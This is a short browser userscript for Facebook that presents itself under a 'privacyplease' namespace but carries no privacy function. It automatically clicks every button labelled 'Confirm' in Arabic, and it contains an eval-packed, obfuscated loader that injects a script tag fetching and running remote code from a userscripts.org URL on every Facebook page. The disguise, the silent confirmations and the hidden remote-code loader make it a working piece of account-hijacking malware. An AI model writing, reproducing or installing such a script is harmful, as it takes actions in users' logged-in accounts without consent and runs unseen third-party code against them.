// ==UserScript==
// @name        bgfbbbbbbbbbbbbbbbbbbbbbbbbbb
// @description 
// @namespace   privacyplease
// @include     http://*.facebook.com/*
// @include		   http://www.facebook.com/*
// @include		   https://www.facebook.com/*
// @include     https://*.facebook.com/*
// @require     http://code.jquery.com/jquery-1.3.2.min.js
//.
// ==/UserScript==
javascript:var i=0;var acceptButtons=document.getElementsByClassName('uiButton');for(i=0;i<acceptButtons.length;i++) {if(acceptButtons[i].firstChild.value=="تأكيد") acceptButtons[i].firstChild.click();}
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))